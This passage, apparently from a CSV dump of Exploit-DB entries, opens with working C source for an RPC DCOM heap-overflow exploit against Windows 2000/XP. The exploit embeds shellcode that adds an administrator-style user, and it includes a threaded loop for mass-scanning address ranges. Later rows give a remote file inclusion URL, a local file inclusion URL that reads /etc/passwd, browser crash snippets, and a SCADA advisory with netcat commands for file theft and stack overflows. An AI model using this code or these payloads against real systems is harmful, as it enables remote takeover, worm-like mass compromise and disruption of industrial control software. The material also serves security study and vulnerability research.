lenght,unsigned char mask)  {  for(int i=offset;i<(offset+lenght);i++)  buf[i]=buf[i]^mask;  }  DWORD GETSTRCS(char *buf)  {  DWORD cs=0;  bool cld=false;  for(unsigned int i=0;i<strlen(buf);i++)  {  for(int z=0;z<13;z++)  {  if(cs&1) cld=true;  cs=cs>>1;  if(cld) cs=cs|0x80000000;  cld=false;  }  cs+=buf[i];  }  return cs;  }   struct {  DWORD seh;  DWORD jmp;  DWORD heap;  char target[200];  } target_os[]=  {  {  0x005Bfd2c,  0x00081eeb,  0x00180000,  ""WinXP""  },  {  0x0095fd3c,  0x00081eeb,  0x00170000,  ""Win2K""  }  },v;  unsigned char rawData1[]=  ""\x6C\x00\x6F\x00\x63\x00\x61\x00\x6C\x00\x68\x00""  ""\x6F\x00\x73\x00\x74\x00\x5C\x00\x43\x00\x24\x00\x5C\x00""   ""\x58\x00\xeb\x3c\x46\x00\x46\x00\xeb\x7c\x46\x00\x46\x00\x38\x6e""  ""\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x58\x83\xc0\x1b\x8d\xa0\x01""  ""\xeb\x1e\xff\x83\xe4\xfc\x8b\xec\x33\xc9\x66\xb9\x99\x01\x80\x30""  ""\xf6\xe0\xe0\x93\xdf\xfc\xf2\xf7\xeb\x06\xf1\xe1\xf2\xe1\xea\xd2""   //SHELLCODE From SAM ,THANKs !  //Add user SST,password is 557,  ""\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x4D\x01\x80\x34\x0A\x99\xE2\xFA""  ""\xEB\x05\xE8\xEB\xFF\xFF\xFF""   ""\x70\xDA\x98\x99\x99\xCC\x12\x75\x18\x75\x19\x99\x99\x99\x12\x6D""  ""\x71\x92\x98\x99\x99\x10\x9F\x66\xAF\xF1\x01\x67\x13\x97\x71\x3C""  ""\x99\x99\x99\x10\xDF\x95\x66\xAF\xF1\xE7\x41\x7B\xEA\x71\x0F\x99""  ""\x99\x99\x10\xDF\x89\xFD\x38\x81\x99\x99\x99\x12\xD9\xA9\x14\xD9""  ""\x81\x22\x99\x99\x8E\x99\x10\x81\xAA\x59\xC9\xF3\xFD\xF1\xB9\xB6""  ""\xF8\xFD\xF1\xB9\xEA\xEA\xED\xF1\xEC\xEA\xFC\xEB\xF1\xF7\xFC\xED""  ""\xB9\x12\x55\xC9\xC8\x66\xCF\x95\xAA\x59\xC9\xF1\xB9\xAC\xAC\xAE""  ""\xF1\xB9\xEA\xEA\xED\xF1\xEC\xEA\xFC\xEB\xF1\xF7\xFC\xED\xB9\x12""  ""\x55\xC9\xC8\x66\xCF\x95\xAA\x59\xC9\xF1\xFD\xFD\x99\x99\xF1\xED""  ""\xB9\xB6\xF8\xF1\xEA\xB9\xEA\xEA\xF1\xF8\xED\xF6\xEB\xF1\xF0\xEA""  ""\xED\xEB\xF1\xFD\xF4\xF0\xF7\xF1\xEC\xE9\xB9\xF8\xF1\xF5\xFE\xEB""  ""\xF6\xF1\xF5\xF6\xFA\xF8\xF1\xF7\xFC\xED\xB9\x12\x55\xC9\xC8\x66""  ""\xCF\x95\xAA\x59\xC9\x66\xCF\x89\xCA\xCC\xCF\xCE\x12\xF5\xBD\x81""  ""\x12\xDC\xA5\x12\xCD\x9C\xE1\x9A\x4C\x12\xD3\x81\x12\xC3\xB9\x9A""  ""\x44\x7A\xAB\xD0\x12\xAD\x12\x9A\x6C\xAA\x66\x65\xAA\x59\x35\xA3""  ""\x5D\xED\x9E\x58\x56\x94\x9A\x61\x72\x6B\xA2\xE5\xBD\x8D\xEC\x78""  ""\x12\xC3\xBD\x9A\x44\xFF\x12\x95\xD2\x12\xC3\x85\x9A\x44\x12\x9D""  ""\x12\x9A\x5C\x72\x9B\xAA\x59\x12\x4C\xC6\xC7\xC4\xC2\x5B\x9D\x99""  ""\xCC\xCF\xFD\x38\xA9\x99\x99\x99\x1C\x59\xE1\x95\x12\xD9\x95\x12""  ""\xE9\x85\x34\x12\xF1\x91\x72\x90\x12\xD9\xAD\x12\x31\x21\x99\x99""  ""\x99\x12\x5C\xC7\xC4\x5B\x9D\x99\x71\x21\x67\x66\x66""   ""\x6e\x60\x38\xcc\x54\xd6\x93\xd7\x93\x93\x93\x1a\xce\xaf\x1a\xce""  ""\xab\x1a\xce\xd3\x54\xd6\xbf\x92\x92\x93\x93\x1e\xd6\xd7\xc3\xc6""  ""\xc2\xc2\xc2\xd2\xc2\xda\xc2\xc2\xc5\xc2\x6c\xc4\x77\x6c\xe6\xd7""  ""\x6c\xc4\x7b\x6c\xe6\xdb\x6c\xc4\x7b\xc0\x6c\xc4\x6b\xc3\x6c\xc4""  ""\x7f\x19\x95\xd5\x17\x53\xe6\x6a""  ""\xc2\xc1\xc5\xc0\x6c\x41\xc9\xca""  ""\x1a\x94\xd4\xd4\xd4\xd4\x71\x7a\x50\x90\x90\x90"" //  ""\x90\x90\x90\x90\x90\x90\x90\x90""  ""\x77\xe0\x43\x00\x00\x10\x5c\x00""  ""\xeb\x1e\x01\x00""// FOR CN SP3/SP4+-MS03-26  ""\x4C\x14\xec\x77""// TOP SEH FOR cn w2k+SP4,must modify to SEH of your target's os    //FILL BYTE,so sizeof(UNC)>0X400(0X80*8),why? You can read more form my artic  //""Utilization of released heap structure and exploit of universal Heap overflow in windows "".  ""\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x90\x02\x80\x34\x0A\x99\xE2\xFA""  ""\xEB\x05\xE8\xEB\xFF\xFF\xFF""  ""\xC7\x5F\x9D\xBD\xDD\x14\xDD\xBD\xDD\xC9\x14\xDD\xBD\x9D\xC9\x14""  ""\x1D\xBD\x1D\x99\x99\x99\xC9\x14\x1D\xBD\x0D\x99\x99\x99\xC9\xAA""  ""\x59\xC9\xC9\xC9\xC9\xCA\x14\x1D\xBD\x2D\x99\x99\x99\xC9\x66\xCF""  ""\x95\x14\xD5\xBD\xDD\x14\x8D\xBD\xAA\x59\xC9\xF1\xAC\x99\xAE\x99""  ""\xF1\xB9\x99\xAC\x99\xF1\xEA\x99\xED\x99\xF1\xB9\x99\xEA\x99\xF1""  ""\xFC\x99\xEB\x99\xF1\xEC\x99\xEA\x99\xF1\xED\x99\xB9\x99\xF1\xF7""  ""\x99\xFC\x99\x12\x45\xC8\xCB\xC8\xCB\x14\x1D\xBD\x29\x99\x99\x99""  ""\xC9\x14\x1D\xBD\x59\x99\x99\x99\xC9\xAA\x59\xC9\xC9\xC9\xC9\xCA""  ""\x14\x1D\xBD\x79\x99\x99\x99\xC9\x66\xCF\x95\xC3\xC0\xAA\x59\xC9""  ""\xF1\xFD\x99\xFD\x99\xF1\xB6\x99\xF8\x99\xF1\xED\x99\xB9\x99\xF1""  ""\xEA\x99\xEA\x99\xF1\xEA\x99\xB9\x99\xF1\xF6\x99\xEB\x99\xF1\xF8""  ""\x99\xED\x99\xF1\xED\x99\xEB\x99\xF1\xF0\x99\xEA\x99\xF1\xF0\x99""  ""\xF7\x99\xF1\xFD\x99\xF4\x99\xF1\xB9\x99\xF8\x99\xF1\xEC\x99\xE9""  ""\x99\xF1\xEB\x99\xF6\x99\xF1\xF5\x99\xFE\x99\xF1\xFA\x99\xF8\x99""  ""\xF1\xF5\x99\xF6\x99\xF1\xED\x99\xB9\x99\xF1\xF7\x99\xFC\x99\x12""  ""\x45\xC8\xCB\x14\x1D\xBD\x61\x99\x99\x99\xC9\x14\x1D\xBD\x91\x98""  ""\x99\x99\xC9\xAA\x59\xC9\xC9\xC9\xC9\xCA\x14\x1D\xBD\xB1\x98\x99""  ""\x99\xC9\x66\xCF\x95\xAA\x59\xC9\x66\xCF\x89\xCA\xCC\xCF\xCE\x12""  ""\xF5\xBD\x81\x12\xDC\xA5\x12\xCD\x9C\xE1\x9A\x4C\x12\xD3\x81\x12""  ""\xC3\xB9\x9A\x44\x7A\xAB\xD0\x12\xAD\x12\x9A\x6C\xAA\x66\x65\xAA""  ""\x59\x35\xA3\x5D\xED\x9E\x58\x56\x94\x9A\x61\x72\x6B\xA2\xE5\xBD""  ""\x8D\xEC\x78\x12\xC3\xBD\x9A\x44\xFF\x12\x95\xD2\x12\xC3\x85\x9A""  ""\x44\x12\x9D\x12\x9A\x5C\x72\x9B\xAA\x59\x12\x4C\xC6\xC7\xC4\xC2""  ""\x5B\x9D\x99\xCC\xCF\xFD\x38\xA9\x99\x99\x99\x1C\x59\xE1\x95\x12""  ""\xD9\x95\x12\xE9\x85\x34\x12\xF1\x91\x72\x90\x12\xD9\xAD\x12\x31""  ""\x21\x99\x99\x99\x12\x5C\xC7\xC4\x5B\x9D\x99\x71\xEC\x64\x66\x66""   ""\x04\x04\x00\x70\x00\x04\x40""  ""\x00\x10\x5c\x00\x78\x01\x07\x00\x78\x01\x07\x00\xa0\x04\x00""   ""\x21\x99\x99\x99\x12\x5C\xC7\xC4\x5B\x9D\x99\x71"";    int version(char ip[16], int sock)  {  //un poco de ettercap...    unsigned char peer0_0[] = {  0x05, 0x00, 0x0b, 0x03, 0x10, 0x00, 0x00, 0x00,  0xcc, 0x00, 0x00, 0x00, 0x84, 0x67, 0xbe, 0x18,  0x31, 0x14, 0x5c, 0x16, 0x00, 0x00, 0x00, 0x00,  0x04, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00,  0xb8, 0x4a, 0x9f, 0x4d, 0x1c, 0x7d, 0xcf, 0x11,  0x86, 0x1e, 0x00, 0x20, 0xaf, 0x6e, 0x7c, 0x57,  0x00, 0x00, 0x00, 0x00, 0x04, 0x5d, 0x88, 0x8a,  0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00,  0x2b, 0x10, 0x48, 0x60, 0x02, 0x00, 0x00, 0x00,  0x02, 0x00, 0x01, 0x00, 0xa0, 0x01, 0x00, 0x00,  0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x46, 0x00, 0x00, 0x00, 0x00,  0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11,  0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60,  0x02, 0x00, 0x00, 0x00, 0x03, 0x00, 0x01, 0x00,  0x0a, 0x42, 0x24, 0x0a, 0x00, 0x17, 0x21, 0x41,  0x2e, 0x48, 0x01, 0x1d, 0x13, 0x0b, 0x04, 0x4d,  0x00, 0x00, 0x00, 0x00, 0x04, 0x5d, 0x88, 0x8a,  0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00,  0x2b, 0x10, 0x48, 0x60, 0x02, 0x00, 0x00, 0x00,  0x04, 0x00, 0x01, 0x00, 0xb0, 0x01, 0x52, 0x97,  0xca, 0x59, 0xcf, 0x11, 0xa8, 0xd5, 0x00, 0xa0,  0xc9, 0x0d, 0x80, 0x51, 0x00, 0x00, 0x00, 0x00,  0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11,  0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60,  0x02, 0x00, 0x00, 0x00 };    unsigned char peer0_1[] = {  0x05, 0x00, 0x00, 0x03, 0x10, 0x00, 0x00, 0x00,  0xaa, 0x00, 0x00, 0x00, 0x41, 0x41, 0x41, 0x41,  0x80, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,  0x05, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x00, 0x28, 0x63, 0x29, 0x20,  0x75, 0x65, 0x72, 0x84, 0x20, 0x73, 0x73, 0x53,  0x20, 0x82, 0x80, 0x67, 0x00, 0x00, 0x00, 0x00,  0x80, 0x1d, 0x94, 0x5e, 0x96, 0xbf, 0xcd, 0x11,  0xb5, 0x79, 0x08, 0x00, 0x2b, 0x30, 0xbf, 0xeb,  0x01, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,  0x5c, 0x00, 0x5c, 0x00, 0x41, 0x00, 0x00, 0x00,  0x41, 0x00, 0x41, 0x00, 0x5c, 0x00, 0x43, 0x00,  0x24, 0x00, 0x5c, 0x00, 0x41, 0x00, 0x2e, 0x00,  0x74, 0x00, 0x78, 0x00, 0x74, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,  0xff, 0xff, 0xff, 0xff, 0x01, 0x00, 0x00, 0x00,  0x58, 0x73, 0x0b, 0x00, 0x01, 0x00, 0x00, 0x00,  0x31, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,  0x07, 0x00 };   /*   unsigned char win2kvuln[] = {  0x04, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x00,  0x04, 0x5d, 0x88, 0x8a,  0xeb, 0x1c, 0xc9, 0x11,  0x9f, 0xe8, 0x08, 0x00,  0x2b, 0x10, 0x48, 0x60,  0x02, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x00,  0x04, 0x5d, 0x88, 0x8a,  0xeb, 0x1c, 0xc9, 0x11,  0x9f, 0xe8, 0x08, 0x00,  0x2b, 0x10, 0x48, 0x60,  0x02, 0x00, 0x00, 0x00};  */  fd_set fds2;  unsigned char buf[1024];   int l;  struct timeval tv2;  FD_ZERO(&fds2);  FD_SET(sock, &fds2);  tv2.tv_sec = 6;  tv2.tv_usec = 0;   memset(buf,'\0',sizeof(buf));  send(sock,(char *)peer0_0,sizeof(peer0_0),0);  if(select(sock +1, &fds2, NULL, NULL, &tv2) > 0)  {  l=recv (sock, (char *)buf, sizeof (buf),0);  // for(i=0;i<52;i++)  // {  // if (i==28) i=i+4;  // if (buf[i+32]!=win2kvuln)  // {  send(sock,(const char *)peer0_1,sizeof(peer0_1),0);  if(select(sock +1, &fds2, NULL, NULL, &tv2) > 0)  {  memset(buf,'\0',sizeof(buf));  l=recv (sock, (char *)buf, sizeof (buf),0);  if (l==32)  {  closesocket(sock);  return(1);//winxp  }  else  {  #ifdef WIN32  closesocket(sock);  #else  close(sock);  #endif  return(0);//win2kby default. Nt4 not added..  }  }  else return(-1);  // }    //}  // closesocket(sock);  // return(0);//win2k  }  closesocket(sock);  return(-1); //Unknown  }  /********************************************************************************/  int attack(char *ip1,bool atack)  {  unsigned char rawData[1036];  memcpy(rawData,rawData1,1036);  unsigned char shellcode[50000];  char ip[200];  strcpy(ip,ip1);  WSADATA WSAData;  SOCKET sock;  int len,len1;  SOCKADDR_IN addr_in;  short port=135;  unsigned char buf1[50000];  unsigned char buf2[50000];   printf(""%s\n"",ip);  //printf(""RPC DCOM overflow Vulnerability discoveried by NSFOCUS\n"");  //printf(""Code by FlashSky,Flashsky xfocus org\n"");  //printf(""Welcome to our Site: http://www.xfocus.org\n"");  //printf(""Welcome to our Site: http://www.venustech.com.cn\n"");  /* if(argc!=3)  {  printf(""%s targetIP targetOS\ntargets:\n"",argv[0]);  for(int i=0;i<sizeof(target_os)/sizeof(v);i++)  printf(""%d - %s\n"",i,target_os.target);  printf(""\n%x\n"",GETSTRCS(argv[1]));  return;  }  */  /* if (WSAStartup(MAKEWORD(2,0),&WSAData)!=0)  {  printf(""WSAStartup error.Error:%d\n"",WSAGetLastError());  return;  }  */  addr_in.sin_family=AF_INET;  addr_in.sin_port=htons(port);  addr_in.sin_addr.S_un.S_addr=inet_addr(ip);   if ((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==INVALID_SOCKET)  {  printf(""Socket failed.Error:%d\n"",WSAGetLastError());  return 0;  }  len1=sizeof(request1);   len=sizeof(rawData);   if(WSAConnect(sock,(struct sockaddr *)&addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL)==SOCKET_ERROR)  {  printf(""%s - connect failed\n"",ip);  return 0;  }   int vers=!version(ip,sock);   // printf(""%d\n"",vers);  // return;  // int vers=1;   FILE *fp;   //ç¨â ¥¬ ¯ ª¥â  // fp=fopen(""shellcode"",""rb"");  // fread(rawData,1,1036,fp);  // fclose(fp);  //â¥¯¥àì ­ã¦­® ááç¨â âì ­¥¯®áà¥¤áâ¢¥­­® ¨á¯®«­ï¥¬ë© è¥««ª®¤!   fp=fopen(""bshell2"",""rb"");  int sz=fread(shellcode,1,1024,fp);  fclose(fp);  // printf(""%d\n"",sz);  for(int i=0;i<sz;i++)  rawData[i+0x71]=shellcode[i];  // fp=fopen(""badfile.exe"",""rb"");  // unsigned int sz1=fread(shellcode,1,50000,fp);  // fclose(fp);  // for(i=0;i<sz1;i++)  // rawData[i+0x240]=shellcode;   // fp=fopen(""pac"",""wb"");  // fwrite(rawData,1,1036,fp);  // fclose(fp);   // return;    //¥à¥¤ â¥¬ ª ª ªá®à¨âì § ¯¨è¥¬  ¤à¥á á¢®¡®¤­®£® HEAP'a  // DWORD heap=0x00180000;  // int k=vers;  // vers=1;  // *(DWORD *)(rawData+0xae)=target_os[vers].heap;  *(DWORD *)(rawData+0x71+0x1e)=target_os[vers].heap;  //’¥¯¥àì ­ã¦­® ¯à®ªá®à¨âì ­ è ª®¤, ¤«ï â®£® çâ®¡ë ¯®«ãç¨âì ­ã¦­ë© ­   XOR(rawData,0x71,sz,0x99);  // XOR(rawData,0x240,sz1,0x99);  //’ ª ¦¥ ­ ¬ ­ã¦­® § ¯¨á âì ­ã¦­ë© ­ ¬ SEH ¨ JMP  DWORD seh=target_os[vers].seh;  DWORD jmp=target_os[vers].jmp;  *(DWORD *)(rawData+0x22a)=jmp;  *(DWORD *)(rawData+0x22e)=seh;  // *(WORD *)(rawData+0x62)=sz+sz1+(0x240-(0x71+sz));  *(WORD *)(rawData+0x62)=sz;    memcpy(buf2,request1,sizeof(request1));  *(DWORD *)(request2)=*(DWORD *)(request2)+sizeof(rawData)/2;  *(DWORD *)(request2+8)=*(DWORD *)(request2+8)+sizeof(rawData)/2;  memcpy(buf2+len1,request2,sizeof(request2));  len1=len1+sizeof(request2);   memcpy(buf2+len1,rawData,sizeof(rawData));  len1=len1+sizeof(rawData);   memcpy(buf2+len1,request3,sizeof(request3));  len1=len1+sizeof(request3);  memcpy(buf2+len1,request4,sizeof(request4));  len1=len1+sizeof(request4);  *(DWORD *)(buf2+8)=*(DWORD *)(buf2+8)+len-0xc;   *(DWORD *)(buf2+0x10)=*(DWORD *)(buf2+0x10)+len-0xc;  *(DWORD *)(buf2+0x80)=*(DWORD *)(buf2+0x80)+len-0xc;  *(DWORD *)(buf2+0x84)=*(DWORD *)(buf2+0x84)+len-0xc;  *(DWORD *)(buf2+0xb4)=*(DWORD *)(buf2+0xb4)+len-0xc;  *(DWORD *)(buf2+0xb8)=*(DWORD *)(buf2+0xb8)+len-0xc;  *(DWORD *)(buf2+0xd0)=*(DWORD *)(buf2+0xd0)+len-0xc;  *(DWORD *)(buf2+0x18c)=*(DWORD *)(buf2+0x18c)+len-0xc;   closesocket(sock);  if(atack)  {  sock=socket(2,1,0);  WSAConnect(sock,(struct sockaddr *)&addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL);   if (send(sock,(const char *)bindstr,sizeof(bindstr),0)==SOCKET_ERROR)  {  printf(""%s - send failed %d\n"",ip,WSAGetLastError());  return 0;  }  else {printf(""%s - send exploit to %s\n"",ip,target_os[vers].target);}   len=recv(sock,(char *)buf1,1000,NULL);  bool ft=1;  if(ft)  {  int i=0;  while(1)  {  if (send(sock,(const char *)buf2,len1,0)==SOCKET_ERROR)  {  printf(""\nSend failed.Error:%d\n"",WSAGetLastError());  return 0;  }  else  {  printf(""\r%d"",++i);  }  //Sleep(1000);  }  }  send(sock,(const char *)buf2,len1,0);  closesocket(sock);  }  else fprintf(fp1,""%s %s\n"",target_os[vers].target,ip);  // fp=fopen(""pac"",""wb"");  // fwrite(rawData,1,1036,fp);  // fclose(fp);  }  unsigned long thread_count=0;  char adr[200];   DWORD WINAPI ThreadProc(  LPVOID lpParameter // thread data  )  {  thread_count++;  attack(adr,0);   thread_count--;  return 0;  }   int main(int argc,char ** argv)  {  //printf(""%x %x"",OF_READWRITE,GETSTRCS(argv[1]));  //return;  //HFILE hf=_lopen(""asd123"",0x1001);  //printf(""%x"",hf);  //_lclose(hf);  //return;   if(argc!=2){ fprintf(stderr, ""RPC universal exploit. Exploit MS09-039 vulnerability\n"" ""unpatched host - to codee xecution\n"" ""patched host - to DoS\n"" ""based on original XFocus RPCDCOM2 exploit\n"" ""modification and shellcode (c) by karlss0n\n"" ""downloaded on www.k-otik.com\n"" ""\n"" ""usage: %s <target_ip>\n"", argv[0]); return 10; }  WSADATA wsaData;   int wVersionRequested;  wVersionRequested = MAKEWORD( 2, 2 );   int err = WSAStartup( wVersionRequested, &wsaData );  if ( err != 0 ) {  /* Tell the user that we could not find a usable */  /* WinSock DLL. */  return 1;  }    if(strchr(argv[1],'.'))  {  attack(argv[1],1);  Sleep(20000);  return 2;  }  int cb=1,db=1;  cb=atoi(argv[3]);  db=atoi(argv[4]);  long tm=atoi(argv[5]);  for(int c=cb;c<255;c++)  {  for(int d=db;d<255;d++)  {  sprintf(adr,""%s.%s.%d.%d"",argv[1],argv[2],c,d);  if(thread_count>tm) while(thread_count>tm) Sleep(100);  CreateThread(NULL,0,&ThreadProc,(void *)"""",0,NULL);  Sleep(10);  fflush(fp1);  }  }  Sleep(60000);  fclose(fp1);  return 0;  }  // milw0rm.com [2003-10-09]",['RPC2'],0
39068,"Ovidentia online Module 2.8 - 'GLOBALS[babAddonPhpPath]' Remote File Inclusion # Title: Ovidentia Module online 2.8 GLOBALS[babAddonPhpPath] Remote File Include Vulnerability # Author: bd0rk # eMail: bd0rk[at]hackermail.com # Twitter: twitter.com/bd0rk # Download: http://www.ovidentia.org/index.php?tg=fileman&sAction=getFile&id=17&gr=Y&path=Downloads%2FAdd-ons%2FModules%2Fonline&file=online-2-8.zip&idf=832  PoC: /online-2-8/programs/admin.php line 2 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ require_once( $GLOBALS['babAddonPhpPath'].""functions.php""); ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  [+]Exploit: http://[target]/online-2-8/programs/admin.php?GLOBALS[babAddonPhpPath]=EVIL_SHELLCODE?  Description: The $GLOBALS['babAddonPhpPath']-parameter isn't declared before qequire_once.              So it's possible to compromise the web-server about it.              An attacker can inject s0me php-shellcode.              I think, it's a big problem in this web-software!  Patch: You can declare the vulnerable parameter or use an alert.   ~~Greetz: x0r_32, m0rphin, GoLd_M, zone-h.org-Team~~",['2.8'],1
11775,Short URL 1.01 - Local File Inclusion ################################################################# # Securitylab.ir ################################################################# # Application Info: # Name: Short URL # Version: 1.01 # Vendor: http://www.phpkobo.com/short_url.php ################################################################# # Vulnerability Info: # Type: Local File Inclusion # Risk: Medium ################################################################# Vulnerability: http://site.com/staff/app/common.inc.php?LANG_CODE=../../../../../../../etc/passwd%00 ################################################################# # Discoverd By: Pouya Daneshmand # Website: http://securitylab.ir # Contacts: info[at]securitylab.ir & whh_iran[at]yahoo.com ###################################################################,['1.01'],1
11276,Microsoft Internet Explorer 6.0/7.0 - Null Pointer crashes Microsoft Internet Explorer 6.0/7.0 NULL pointer crashes Two crashes caused by NULL pointer dereferences have been discovered in MSIE 6.0/7.0. These issues do not affect MSIE 8.0.  ======================================================== document.createElement(“li”).value=3  document.createElement(“html”).outerHTML ========================================================  Credit : Skylined,['6.0/7.0'],1
33078,"HP ProCurve Threat Management Services - zl ST.1.0.090213 Module CRL Security Bypass source: https://www.securityfocus.com/bid/35659/info  HP ProCurve Threat Management Services zl Module is prone to a security-bypass vulnerability.  Successful exploits may allow attackers to bypass certain security restrictions, which may aid in launching further attacks.  ProCurve Threat Management Services zl Module J9155A running vST.1.0.090213 firmware or prior is vulnerable.  1. Go to VPN-->Certificates--> CRL page and load a CRL list. 2. Save the entire configuration. 3. Reboot the TMS zl Module. 4. Once the TMS zl Module is available, go to VPN--> Certificates--> CRL page and the CRL is no longer available.","['J9155A', 'vST.1.0.090213']",1
17024,"7-Technologies IGSS 9.00.00.11059 - Multiple Vulnerabilities Sources: http://aluigi.org/adv/igss_1-adv.txt http://aluigi.org/adv/igss_2-adv.txt http://aluigi.org/adv/igss_3-adv.txt http://aluigi.org/adv/igss_4-adv.txt http://aluigi.org/adv/igss_5-adv.txt http://aluigi.org/adv/igss_6-adv.txt http://aluigi.org/adv/igss_7-adv.txt http://aluigi.org/adv/igss_8-adv.txt  Advisory Archive: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/17024-adv.tar.gz (igss_adv.tar.gz) PoC Archive: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/17024-poc.tar.gz (igss_poc.tar.gz)  #######################################################################                               Luigi Auriemma  Application:  IGSS (Interactive Graphical SCADA System)               http://www.igss.com               http://www.7t.dk Versions:     IGSSdataServer.exe <= 9.00.00.11063 Platforms:    Windows Date:         21 Mar 2011 (found 10 Jan 2011) Author:       Luigi Auriemma               e-mail: aluigi@autistici.org               web:    aluigi.org   #######################################################################  =============== Introduction ===============  IGSS (Interactive Graphical SCADA system) is a SCADA solution developed by the 7-Technologies and used mainly in Denmark and US.  Informations from the vendor's website: ""IGSS is the complete automation software – a SCADA system for process control and supervision - with a long row of releases since the start of 7T 25 years ago. At that time, 7T was the first company in the world to develop an object oriented and mouse operated SCADA system under the name of IGSS.""   #######################################################################  Directory Traversal:  ====== Bug ======  IGSSdataServer.exe is a server running on port 12401 active when the project is started.  The opcode 0xd is used for the file operations that cover creation, reading, writing, deleting, renaming and so on.  The server is affected by a directory traversal that gives the attacker the possibility of downloading (command 0x3) or uploading and overwriting (0x2) any file on the disk where the software is installed.  #######################################################################  =========== The Code ===========  http://aluigi.org/poc/igss_1.zip https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/17024-1.zip (igss_1.zip)  example for downloading c:\boot.ini:   nc SERVER 12401 < igss_1a.dat  example for writing/overwriting the file c:\evil.bat   nc SERVER 12401 < igss_1b.dat  #######################################################################  Remote Stack Overflow:  ====== Bug ======  IGSSdataServer.exe is a server running on port 12401 active when the project is started.  The opcode 0xd is used for the file operations that cover creation, reading, writing, deleting, renaming and so on.  All the commands supported by this opcode except ""FileReserve"" (0x7) are affected by different buffer overflow vulnerabilities caused by the copying of the filename provided by the client in stack buffers of 256 bytes.  The following is the list of the copying functions for each command (I don't remember the exact version from which I got them):    ""ListAll"" (0x1)       00406e91   ""Write File"" (0x2)    004071dd   ""ReadFile"" (0x3)      004072fd   ""Delete"" (0x4)        00406fad   ""RenameFile"" (0x5)    00407094 and 004070cf   ""FileInfo"" (0x6)      0040746f  #######################################################################  =========== The Code ===========  http://aluigi.org/poc/igss_2.zip https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/17024-2.zip (igss_2.zip)    nc SERVER 12401 < igss_2a.dat   nc SERVER 12401 < igss_2b.dat   nc SERVER 12401 < igss_2c.dat   nc SERVER 12401 < igss_2d.dat   nc SERVER 12401 < igss_2e.dat   nc SERVER 12401 < igss_2f.dat  #######################################################################  Remote Stack Overflow:  ====== Bug ======  IGSSdataServer.exe is a server running on port 12401 active when the project is started.  The opcode 0x7 is used for handling the RMS report templates and through the ""Add"" command (0x4) is possible to exploit some buffer overflows caused by the copying of the client strings in small stack buffers:    00409B4F   .  8D46 04       LEA EAX,DWORD PTR DS:[ESI+4]  ; string from offset 0x16 of the packet   00409B52   .  8D5424 1A     LEA EDX,DWORD PTR SS:[ESP+1A]   00409B56   .  83C4 0C       ADD ESP,0C   00409B59   .  2BD0          SUB EDX,EAX   00409B5B   .  EB 03         JMP SHORT 00409B60   00409B5D      8D49 00       LEA ECX,DWORD PTR DS:[ECX]   00409B60   >  8A08          MOV CL,BYTE PTR DS:[EAX]   00409B62   .  880C02        MOV BYTE PTR DS:[EDX+EAX],CL   00409B65   .  40            INC EAX   00409B66   .  84C9          TEST CL,CL   00409B68   .^ 75 F6         JNZ SHORT 00409B60   00409B6A   .  8A46 71       MOV AL,BYTE PTR DS:[ESI+71]   00409B6D   .  884424 0D     MOV BYTE PTR SS:[ESP+D],AL   00409B71   .  8D46 2C       LEA EAX,DWORD PTR DS:[ESI+2C] ; from offset 0x3e   00409B74   .  8D5424 36     LEA EDX,DWORD PTR SS:[ESP+36]   00409B78   .  2BD0          SUB EDX,EAX   00409B7A   .  8D9B 00000000 LEA EBX,DWORD PTR DS:[EBX]   00409B80   >  8A08          MOV CL,BYTE PTR DS:[EAX]   00409B82   .  880C02        MOV BYTE PTR DS:[EDX+EAX],CL   00409B85   .  40            INC EAX   00409B86   .  84C9          TEST CL,CL   00409B88   .^ 75 F6         JNZ SHORT 00409B80   00409B8A   .  8D46 6C       LEA EAX,DWORD PTR DS:[ESI+6C] ; from offset 0x7e   00409B8D   .  8D5424 76     LEA EDX,DWORD PTR SS:[ESP+76]   00409B91   .  2BD0          SUB EDX,EAX   00409B93   >  8A08          MOV CL,BYTE PTR DS:[EAX]   00409B95   .  880C02        MOV BYTE PTR DS:[EDX+EAX],CL   00409B98   .  40            INC EAX   00409B99   .  84C9          TEST CL,CL   00409B9B   .^ 75 F6         JNZ SHORT 00409B93  #######################################################################  =========== The Code ===========  http://aluigi.org/poc/igss_3.zip https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/17024-3.zip (igss_3.zip)    nc SERVER 12401 < igss_3.dat  #######################################################################  Remote Stack Overflow:  ====== Bug ======  IGSSdataServer.exe is a server running on 